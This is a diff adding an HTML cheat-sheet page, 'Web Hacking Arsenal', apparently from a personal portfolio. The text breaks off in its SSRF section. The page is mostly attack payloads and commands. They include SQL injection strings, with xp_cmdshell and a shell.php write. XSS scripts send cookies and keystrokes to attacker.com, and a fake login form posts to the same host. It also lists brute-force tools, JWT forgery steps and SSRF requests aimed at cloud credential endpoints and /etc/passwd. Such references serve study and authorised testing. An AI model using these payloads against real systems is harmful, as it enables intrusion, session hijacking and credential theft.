@@ -1,0 +1,2005 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Hacking Arsenal - Yamashita</title>
+    <link rel="icon" type="image/x-icon" href="img/puffin_favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-red: #00ff9b;
+            --dark-bg: #0a0a0f;
+            --card-bg: #131318;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0b0;
+            --border-color: #1f1f2e;
+            --accent-gold: #00d4ff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--dark-bg) 0%, #001a0a 100%);
+            border-bottom: 2px solid var(--primary-red);
+            padding: 30px 0;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .header-title {
+            text-align: left;
+            flex: 1;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 24px;
+            background: transparent;
+            color: var(--primary-red);
+            border: 2px solid var(--primary-red);
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .back-link:hover {
+            background: var(--primary-red);
+            color: var(--dark-bg);
+            transform: translateX(-5px);
+        }
+
+        h1 {
+            font-size: 2.5em;
+            color: var(--primary-red);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .subtitle {
+            color: var(--accent-gold);
+            font-size: 1.1em;
+            font-style: italic;
+        }
+
+        .nav-tabs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: var(--card-bg);
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .tab-btn {
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            border: 2px solid var(--primary-red);
+            padding: 12px 24px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 0.95em;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+
+        .tab-btn:hover {
+            background: var(--primary-red);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(196, 30, 58, 0.4);
+        }
+
+        .tab-btn.active {
+            background: var(--primary-red);
+            color: white;
+        }
+
+        .section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-left: 4px solid var(--primary-red);
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateX(5px);
+            box-shadow: 0 6px 12px rgba(196, 30, 58, 0.2);
+        }
+
+        h2 {
+            color: var(--primary-red);
+            font-size: 1.8em;
+            margin-bottom: 15px;
+            border-bottom: 2px solid var(--primary-red);
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: var(--accent-gold);
+            font-size: 1.4em;
+            margin-top: 20px;
+            margin-bottom: 15px;
+        }
+
+        h4 {
+            color: var(--text-primary);
+            font-size: 1.1em;
+            margin-top: 15px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        code {
+            background: var(--dark-bg);
+            color: #00ff00;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+
+        pre {
+            background: var(--dark-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            padding: 15px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            display: block;
+            color: #00ff00;
+        }
+
+        .command-box {
+            background: #000;
+            border: 2px solid var(--primary-red);
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+        }
+
+        .command-box .prompt {
+            color: var(--primary-red);
+            font-weight: bold;
+        }
+
+        .command-box .command {
+            color: #00ff00;
+        }
+
+        .warning {
+            background: rgba(196, 30, 58, 0.1);
+            border-left: 4px solid var(--primary-red);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+
+        .warning::before {
+            content: "⚠ WARNING: ";
+            color: var(--primary-red);
+            font-weight: bold;
+        }
+
+        .tip {
+            background: rgba(212, 175, 55, 0.1);
+            border-left: 4px solid var(--accent-gold);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+
+        .tip::before {
+            content: "💡 TIP: ";
+            color: var(--accent-gold);
+            font-weight: bold;
+        }
+
+        ul, ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+        }
+
+        li {
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .tool-card {
+            background: var(--dark-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            padding: 15px;
+        }
+
+        .tool-card h4 {
+            color: var(--primary-red);
+            margin-top: 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            background: var(--dark-bg);
+        }
+
+        th {
+            background: var(--primary-red);
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        td {
+            border: 1px solid var(--border-color);
+            padding: 10px;
+            color: var(--text-secondary);
+        }
+
+        tr:hover {
+            background: var(--card-bg);
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 15px;
+            background: var(--card-bg);
+            border: 2px solid var(--primary-red);
+            border-radius: 5px;
+            color: var(--text-primary);
+            font-size: 1em;
+            margin-bottom: 20px;
+        }
+
+        .search-box:focus {
+            outline: none;
+            border-color: var(--accent-gold);
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.3);
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            margin-top: 50px;
+            border-top: 2px solid var(--primary-red);
+            color: var(--text-secondary);
+        }
+
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--primary-red);
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            font-size: 1.5em;
+            box-shadow: 0 4px 10px rgba(196, 30, 58, 0.5);
+        }
+
+        .back-to-top.visible {
+            opacity: 1;
+        }
+
+        .back-to-top:hover {
+            background: var(--accent-gold);
+        }
+
+        @media (max-width: 768px) {
+            h1 { font-size: 2em; }
+            .nav-tabs { flex-direction: column; }
+            .tab-btn { width: 100%; }
+            .grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <div class="header-title">
+                <h1>🗡️ Web Hacking Arsenal 🗡️</h1>
+                <p class="subtitle">"The blade that cuts through digital defenses"</p>
+            </div>
+            <a href="index.html" class="back-link">
+                <span>← Back to Portfolio</span>
+            </a>
+        </div>
+    </header>
+
+    <div class="container">
+        <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search the arsenal... (e.g., 'SQL injection', 'XSS', 'tools')">
+
+        <div class="nav-tabs">
+            <button class="tab-btn active" onclick="showSection('recon')">Reconnaissance</button>
+            <button class="tab-btn" onclick="showSection('sqli')">SQL Injection</button>
+            <button class="tab-btn" onclick="showSection('xss')">XSS</button>
+            <button class="tab-btn" onclick="showSection('auth')">Authentication</button>
+            <button class="tab-btn" onclick="showSection('idor')">IDOR & Access Control</button>
+            <button class="tab-btn" onclick="showSection('ssrf')">SSRF</button>
+            <button class="tab-btn" onclick="showSection('lfi')">LFI/RFI</button>
+            <button class="tab-btn" onclick="showSection('xxe')">XXE</button>
+            <button class="tab-btn" onclick="showSection('deserial')">Deserialization</button>
+            <button class="tab-btn" onclick="showSection('api')">API Testing</button>
+            <button class="tab-btn" onclick="showSection('tools')">Tools & Commands</button>
+            <button class="tab-btn" onclick="showSection('payloads')">Payload Library</button>
+        </div>
+
+        <!-- RECONNAISSANCE SECTION -->
+        <div id="recon" class="section active">
+            <div class="card">
+                <h2>🔭 Reconnaissance & Enumeration</h2>
+                
+                <h3>Subdomain Enumeration</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">subfinder -d target.com -o subdomains.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">assetfinder --subs-only target.com</span><br>
+                    <span class="prompt">$</span> <span class="command">amass enum -d target.com -o amass-output.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">sublist3r -d target.com -o sublist3r.txt</span>
+                </div>
+
+                <h3>Directory & File Discovery</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302</span><br>
+                    <span class="prompt">$</span> <span class="command">dirsearch -u https://target.com -e php,html,js,txt,zip</span><br>
+                    <span class="prompt">$</span> <span class="command">feroxbuster -u https://target.com -w wordlist.txt -x php,html,txt</span>
+                </div>
+
+                <h3>Technology Fingerprinting</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">whatweb -a 3 https://target.com</span><br>
+                    <span class="prompt">$</span> <span class="command">wappalyzer https://target.com</span><br>
+                    <span class="prompt">$</span> <span class="command">nmap -sV --script=http-enum target.com</span><br>
+                    <span class="prompt">$</span> <span class="command">wafw00f https://target.com</span>
+                </div>
+
+                <h3>Content Discovery</h3>
+                <div class="tip">
+                    Check robots.txt, sitemap.xml, .git, .svn, .DS_Store, backup files (.bak, .old, .backup), and common admin panels.
+                </div>
+
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">curl https://target.com/robots.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">curl https://target.com/sitemap.xml</span><br>
+                    <span class="prompt">$</span> <span class="command">wget -r --no-parent https://target.com/.git/</span>
+                </div>
+
+                <h3>JavaScript Analysis</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">subjs -i subdomains.txt | httpx -mc 200 | tee js-files.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">python3 linkfinder.py -i https://target.com -o cli</span><br>
+                    <span class="prompt">$</span> <span class="command">nuclei -l js-files.txt -t ~/nuclei-templates/exposures/</span>
+                </div>
+
+                <div class="tip">
+                    Look for API endpoints, sensitive comments, hardcoded credentials, and internal paths in JavaScript files.
+                </div>
+
+                <h3>Google Dorking</h3>
+                <pre><code>site:target.com inurl:admin
+site:target.com filetype:pdf
+site:target.com intext:"index of"
+site:target.com ext:sql | ext:xml | ext:json
+site:target.com intitle:"index of" "parent directory"</code></pre>
+            </div>
+        </div>
+
+        <!-- SQL INJECTION SECTION -->
+        <div id="sqli" class="section">
+            <div class="card">
+                <h2>💉 SQL Injection</h2>
+                
+                <h3>Detection Payloads</h3>
+                <pre><code>' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin' --
+admin' #
+' OR 1=1--
+') OR ('1'='1
+'||'1'='1
+' AND '1'='2
+1' AND '1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--</code></pre>
+
+                <h3>SQLMap - Automated Exploitation</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">sqlmap -u "http://target.com/page?id=1" --dbs</span><br>
+                    <span class="prompt">$</span> <span class="command">sqlmap -u "http://target.com/page?id=1" -D database --tables</span><br>
+                    <span class="prompt">$</span> <span class="command">sqlmap -u "http://target.com/page?id=1" -D database -T users --columns</span><br>
+                    <span class="prompt">$</span> <span class="command">sqlmap -u "http://target.com/page?id=1" -D database -T users --dump</span><br>
+                    <span class="prompt">$</span> <span class="command">sqlmap -r request.txt --batch --level=5 --risk=3</span>
+                </div>
+
+                <h3>Union-Based SQLi</h3>
+                <pre><code>' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--</code></pre>
+
+                <h3>Blind SQLi - Boolean Based</h3>
+                <pre><code>' AND 1=1--  (True condition)
+' AND 1=2--  (False condition)
+' AND SUBSTRING(database(),1,1)='a'--
+' AND ASCII(SUBSTRING(database(),1,1))>97--
+' AND LENGTH(database())>5--</code></pre>
+
+                <h3>Time-Based Blind SQLi</h3>
+                <pre><code>' AND SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND BENCHMARK(5000000,MD5('A'))--
+' OR IF(1=1,SLEEP(5),0)--</code></pre>
+
+                <h3>Error-Based SQLi</h3>
+                <pre><code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--
+' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--</code></pre>
+
+                <h3>Second-Order SQLi</h3>
+                <div class="tip">
+                    Inject payload in one location (e.g., registration), then trigger it in another (e.g., profile page). Test username fields, comments, and any stored data.
+                </div>
+
+                <h3>Database-Specific Commands</h3>
+                <h4>MySQL</h4>
+                <pre><code>SELECT version()
+SELECT database()
+SELECT user()
+SELECT @@version
+SELECT schema_name FROM information_schema.schemata
+LOAD_FILE('/etc/passwd')
+INTO OUTFILE '/var/www/html/shell.php'</code></pre>
+
+                <h4>PostgreSQL</h4>
+                <pre><code>SELECT version()
+SELECT current_database()
+SELECT current_user
+SELECT usename FROM pg_user
+COPY (SELECT '') TO '/tmp/output.txt'</code></pre>
+
+                <h4>MSSQL</h4>
+                <pre><code>SELECT @@version
+SELECT DB_NAME()
+SELECT SYSTEM_USER
+EXEC xp_cmdshell 'whoami'
+EXEC sp_configure 'show advanced options', 1</code></pre>
+
+                <div class="warning">
+                    Always test in authorized environments only. SQL injection can cause data loss and system damage. SKARR AKAO BOTSA!!! MY CHOMMIE.
+                </div>
+            </div>
+        </div>
+
+        <!-- XSS SECTION -->
+        <div id="xss" class="section">
+            <div class="card">
+                <h2>🔥 Cross-Site Scripting (XSS)</h2>
+                
+                <h3>Basic XSS Payloads</h3>
+                <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg/onload=alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;
+&lt;input autofocus onfocus=alert('XSS')&gt;
+&lt;select autofocus onfocus=alert('XSS')&gt;
+&lt;textarea autofocus onfocus=alert('XSS')&gt;
+&lt;details open ontoggle=alert('XSS')&gt;</code></pre>
+
+                <h3>Filter Bypass Techniques</h3>
+                <pre><code>&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;
+&lt;script&gt;ale\u0072t('XSS')&lt;/script&gt;
+&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&lt;/script&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;img src=x oneonerrorrror=alert('XSS')&gt;
+&lt;svg&gt;&lt;script&gt;alert&amp;#40;'XSS'&amp;#41;&lt;/script&gt;</code></pre>
+
+                <h3>Advanced Payloads</h3>
+                <h4>Cookie Stealing</h4>
+                <pre><code>&lt;script&gt;
+fetch('https://attacker.com/steal?c=' + document.cookie);
+&lt;/script&gt;
+
+&lt;script&gt;
+new Image().src='https://attacker.com/log?c='+encodeURIComponent(document.cookie);
+&lt;/script&gt;</code></pre>
+
+                <h4>Keylogger</h4>
+                <pre><code>&lt;script&gt;
+document.onkeypress = function(e) {
+    fetch('https://attacker.com/log?key=' + e.key);
+}
+&lt;/script&gt;</code></pre>
+
+                <h4>Phishing</h4>
+                <pre><code>&lt;script&gt;
+document.body.innerHTML = '&lt;h1&gt;Session Expired&lt;/h1&gt;&lt;form action="https://attacker.com/phish"&gt;&lt;input name="user"&gt;&lt;input type="password" name="pass"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;';
+&lt;/script&gt;</code></pre>
+
+                <h3>DOM-Based XSS</h3>
+                <div class="tip">
+                    Look for JavaScript that uses user input without sanitization: document.write(), innerHTML, eval(), setTimeout(), location.href
+                </div>
+                <pre><code># URL: http://target.com/#&lt;script&gt;alert('XSS')&lt;/script&gt;
+# URL: http://target.com/?name=&lt;img src=x onerror=alert('XSS')&gt;</code></pre>
+
+                <h3>Stored vs Reflected XSS</h3>
+                <table>
+                    <tr>
+                        <th>Type</th>
+                        <th>Description</th>
+                        <th>Testing Approach</th>
+                    </tr>
+                    <tr>
+                        <td><strong>Reflected</strong></td>
+                        <td>Payload in URL/request, reflected in response</td>
+                        <td>Test all input fields, URL parameters, headers</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stored</strong></td>
+                        <td>Payload saved in database, executed when viewed</td>
+                        <td>Test comments, profiles, posts, messages</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DOM-Based</strong></td>
+                        <td>Executed client-side via DOM manipulation</td>
+                        <td>Analyze JavaScript, test URL fragments (#)</td>
+                    </tr>
+                </table>
+
+                <h3>CSP Bypass</h3>
+                <pre><code># If script-src allows 'unsafe-inline':
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# If JSONP endpoint allowed:
+&lt;script src="https://allowed-domain.com/jsonp?callback=alert"&gt;&lt;/script&gt;
+
+# If base-uri not set:
+&lt;base href="https://attacker.com/"&gt;</code></pre>
+
+                <h3>Testing Methodology</h3>
+                <ol>
+                    <li>Identify all input points (forms, URL params, headers)</li>
+                    <li>Test basic payloads (&lt;script&gt;alert(1)&lt;/script&gt;)</li>
+                    <li>Analyze response encoding (HTML, URL, JS context)</li>
+                    <li>Test context-specific payloads</li>
+                    <li>Try filter bypass techniques</li>
+                    <li>Check for DOM-based XSS in JavaScript</li>
+                    <li>Test stored XSS in all data storage points</li>
+                </ol>
+
+                <div class="warning">
+                    Use alert(document.domain) instead of alert('XSS') to prove the vulnerability is in the target domain, not your payload.
+                </div>
+            </div>
+        </div>
+
+        <!-- AUTHENTICATION SECTION -->
+        <div id="auth" class="section">
+            <div class="card">
+                <h2>🔐 Authentication & Session Management</h2>
+                
+                <h3>Common Authentication Flaws</h3>
+                <ul>
+                    <li>Weak password policy</li>
+                    <li>Default credentials (admin/admin, admin/password123)</li>
+                    <li>Predictable session tokens</li>
+                    <li>Session fixation</li>
+                    <li>Missing session expiration</li>
+                    <li>Lack of account lockout</li>
+                    <li>Username enumeration</li>
+                    <li>Password reset vulnerabilities</li>
+                </ul>
+
+                <h3>Brute Force Attacks</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"</span><br>
+                    <span class="prompt">$</span> <span class="command">ffuf -w usernames.txt:USER -w passwords.txt:PASS -u https://target.com/login -X POST -d "username=USER&password=PASS" -fr "Invalid"</span><br>
+                    <span class="prompt">$</span> <span class="command">wfuzz -c -z file,users.txt -z file,pass.txt --hc 404 -d "user=FUZZ&pass=FUZ2Z" https://target.com/login</span>
+                </div>
+
+                <h3>Username Enumeration</h3>
+                <div class="tip">
+                    Different responses for valid vs invalid usernames reveal user existence. Check response time, message differences, HTTP status codes.
+                </div>
+                <pre><code>Valid user: "Invalid password"
+Invalid user: "User does not exist"
+
+Timing attack: Valid users take longer (password check)
+Status codes: 200 for valid, 404 for invalid</code></pre>
+
+                <h3>Password Reset Vulnerabilities</h3>
+                <h4>Common Issues:</h4>
+                <ul>
+                    <li>Predictable reset tokens</li>
+                    <li>Token not expiring</li>
+                    <li>Token reusable</li>
+                    <li>Host header injection</li>
+                    <li>Parameter pollution</li>
+                </ul>
+
+                <h4>Testing Techniques:</h4>
+                <pre><code># Host header injection
+POST /reset HTTP/1.1
+Host: attacker.com
+
+# Parameter pollution
+email=victim@target.com&email=attacker@evil.com
+
+# Token prediction
+Reset tokens: abc123, abc124, abc125 (sequential)
+
+# No rate limiting
+Brute force reset tokens</code></pre>
+
+                <h3>Session Management Attacks</h3>
+                <h4>Session Fixation</h4>
+                <pre><code>1. Attacker gets session: SESSIONID=malicious123
+2. Victim clicks link: https://target.com/?SESSIONID=malicious123
+3. Victim logs in with attacker's session
+4. Attacker uses SESSIONID=malicious123 to access victim's account</code></pre>
+
+                <h4>Session Hijacking</h4>
+                <ul>
+                    <li>Steal via XSS: document.cookie</li>
+                    <li>Network sniffing (non-HTTPS)</li>
+                    <li>Predict session tokens</li>
+                </ul>
+
+                <h3>JWT (JSON Web Token) Attacks</h3>
+                <h4>Algorithm Confusion</h4>
+                <pre><code># Change "alg":"RS256" to "alg":"HS256"
+# Server now uses public key as HMAC secret</code></pre>
+
+                <h4>None Algorithm</h4>
+                <pre><code># Change "alg":"HS256" to "alg":"none"
+# Remove signature portion
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</code></pre>
+
+                <h4>Weak Secret</h4>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">hashcat -a 0 -m 16500 jwt.txt wordlist.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt</span>
+                </div>
+
+                <h4>JWT Testing Tools</h4>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">jwt_tool eyJ0eXAi... -C -d secrets.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">jwt_tool eyJ0eXAi... -X a</span>
+                </div>
+
+                <h3>OAuth/SSO Vulnerabilities</h3>
+                <ul>
+                    <li>Open redirect in redirect_uri</li>
+                    <li>CSRF in OAuth flow</li>
+                    <li>Account takeover via email parameter</li>
+                    <li>Pre-account takeover (sign up with victim email)</li>
+                </ul>
+
+                <h3>2FA/MFA Bypass</h3>
+                <ul>
+                    <li>Response manipulation (change "success":false to true)</li>
+                    <li>Status code manipulation (change 401 to 200)</li>
+                    <li>Direct request to post-login page</li>
+                    <li>Rate limiting bypass (IP rotation)</li>
+                    <li>Backup codes enumeration</li>
+                    <li>CSRF on 2FA disable</li>
+                </ul>
+
+                <div class="warning">
+                    Test authentication extensively - it's the gateway to the entire application!
+                </div>
+            </div>
+        </div>
+
+        <!-- IDOR & ACCESS CONTROL SECTION -->
+        <div id="idor" class="section">
+            <div class="card">
+                <h2>🚪 IDOR & Broken Access Control</h2>
+                
+                <h3>What is IDOR?</h3>
+                <p>Insecure Direct Object Reference - accessing resources by modifying parameter values without proper authorization checks.</p>
+
+                <h3>Common IDOR Patterns</h3>
+                <h4>Numeric IDs</h4>
+                <pre><code>https://target.com/api/user/1234
+https://target.com/api/user/1235 (Try other IDs)
+
+https://target.com/invoice?id=100
+https://target.com/invoice?id=101 (Access other invoices)</code></pre>
+
+                <h4>Encoded IDs</h4>
+                <pre><code># Base64
+https://target.com/profile?user=am9obg== (john)
+https://target.com/profile?user=amFuZQ== (jane)
+
+# Hashed IDs
+https://target.com/doc?id=5d41402abc4b2a76b9719d911017c592 (MD5 of "hello")
+Crack or predict the hash function</code></pre>
+
+                <h4>UUID/GUID</h4>
+                <pre><code>https://target.com/file/550e8400-e29b-41d4-a716-446655440000
+Try brute force, prediction, or information disclosure</code></pre>
+
+                <h3>Testing Methodology</h3>
+                <ol>
+                    <li>Create two accounts (attacker & victim)</li>
+                    <li>Identify all object references (user IDs, document IDs, etc.)</li>
+                    <li>Try accessing victim's resources with attacker's session</li>
+                    <li>Test both GET and POST requests</li>
+                    <li>Check JSON/XML body parameters</li>
+                    <li>Test with no authentication</li>
+                    <li>Test with lower privilege user</li>
+                </ol>
+
+                <h3>Advanced IDOR Techniques</h3>
+                <h4>Parameter Pollution</h4>
+                <pre><code>GET /api/user?id=attacker_id&id=victim_id
+POST with multiple ID parameters</code></pre>
+
+                <h4>HTTP Method Override</h4>
+                <pre><code>POST /api/user/123 (Forbidden)
+PUT /api/user/123 (Success)
+DELETE /api/user/123 (Check this too)</code></pre>
+
+                <h4>Path Traversal Combined</h4>
+                <pre><code>GET /api/user/../../admin/123
+GET /api/user/%2e%2e%2fadmin/123</code></pre>
+
+                <h3>Horizontal vs Vertical Privilege Escalation</h3>
+                <table>
+                    <tr>
+                        <th>Type</th>
+                        <th>Description</th>
+                        <th>Example</th>
+                    </tr>
+                    <tr>
+                        <td><strong>Horizontal</strong></td>
+                        <td>Access resources of same privilege level</td>
+                        <td>User A accesses User B's profile</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Vertical</strong></td>
+                        <td>Access resources of higher privilege</td>
+                        <td>Regular user accesses admin panel</td>
+                    </tr>
+                </table>
+
+                <h3>Common Vulnerable Endpoints</h3>
+                <ul>
+                    <li>/api/user/{id}</li>
+                    <li>/profile?user={id}</li>
+                    <li>/download?file={id}</li>
+                    <li>/invoice/{id}</li>
+                    <li>/order/{id}</li>
+                    <li>/document/{id}</li>
+                    <li>/admin/user/{id}</li>
+                    <li>/delete?id={id}</li>
+                </ul>
+
+                <h3>Broken Function Level Access Control</h3>
+                <pre><code># Regular user accessing admin functions
+GET /api/admin/users (Should be forbidden)
+POST /api/admin/deleteUser (Should be forbidden)
+
+# Forced browsing
+https://target.com/admin
+https://target.com/administrator
+https://target.com/moderator
+https://target.com/staff</code></pre>
+
+                <h3>Testing with Burp Suite</h3>
+                <div class="tip">
+                    Use "Autorize" extension to automatically test access control for every request with different user sessions.
+                </div>
+
+                <div class="command-box">
+                    <span class="prompt">1.</span> <span class="command">Proxy requests through Burp</span><br>
+                    <span class="prompt">2.</span> <span class="command">Identify ID parameters</span><br>
+                    <span class="prompt">3.</span> <span class="command">Send to Intruder</span><br>
+                    <span class="prompt">4.</span> <span class="command">Set payload position on ID</span><br>
+                    <span class="prompt">5.</span> <span class="command">Use number list (1-1000)</span><br>
+                    <span class="prompt">6.</span> <span class="command">Check responses for unauthorized data</span>
+                </div>
+
+                <h3>Automated Testing</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">autorize  # Burp Suite extension</span><br>
+                    <span class="prompt">$</span> <span class="command">arjun -u https://target.com/api  # Find hidden parameters</span><br>
+                    <span class="prompt">$</span> <span class="command">paramspider -d target.com  # Extract parameters from archives</span>
+                </div>
+
+                <div class="warning">
+                    IDORs can lead to data breaches affecting thousands of users. Always test thoroughly and report responsibly.
+                </div>
+            </div>
+        </div>
+
+        <!-- SSRF SECTION -->
+        <div id="ssrf" class="section">
+            <div class="card">
+                <h2>🌐 Server-Side Request Forgery (SSRF)</h2>
+                
+                <h3>What is SSRF?</h3>
+                <p>SSRF allows an attacker to make the server send requests to internal or external systems, potentially accessing internal resources or services.</p>
+
+                <h3>Common SSRF Entry Points</h3>
+                <ul>
+                    <li>URL parameters (url=, uri=, path=, dest=)</li>
+                    <li>File upload (import from URL)</li>
+                    <li>Webhooks</li>
+                    <li>PDF generators</li>
+                    <li>Image processors</li>
+                    <li>API integrations</li>
+                </ul>
+
+                <h3>Basic SSRF Payloads</h3>
+                <pre><code># Localhost access
+http://localhost
+http://127.0.0.1
+http://[::1]
+http://0.0.0.0
+
+# Internal network scanning
+http://192.168.0.1
+http://192.168.1.1
+http://10.0.0.1
+http://172.16.0.1</code></pre>
+
+                <h3>Bypass Techniques</h3>
+                <h4>Domain Blacklist Bypass</h4>
+                <pre><code># Alternative representations of 127.0.0.1
+http://127.1
+http://127.0.1
+http://2130706433 (Decimal)
+http://0x7f000001 (Hexadecimal)
+http://017700000001 (Octal)
+
+# DNS tricks
+http://localtest.me (Resolves to 127.0.0.1)
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+
+# URL parser confusion
+http://evil.com@127.0.0.1
+http://127.0.0.1#@evil.com</code></pre>
+
+                <h4>Protocol Smuggling</h4>
+                <pre><code>file:///etc/passwd
+file:///c:/windows/win.ini
+dict://127.0.0.1:6379/info
+gopher://127.0.0.1:6379/_SET%20key%20value
+ldap://127.0.0.1
+tftp://127.0.0.1</code></pre>
+
+                <h4>Open Redirect for SSRF</h4>
+                <pre><code># If site has open redirect
+https://target.com/redirect?url=http://evil.com
+
+# Use it for SSRF
+https://vulnerable.com/fetch?url=https://target.com/redirect?url=http://127.0.0.1</code></pre>
+
+                <h3>Cloud Metadata Endpoints</h3>
+                <h4>AWS</h4>
+                <pre><code>http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
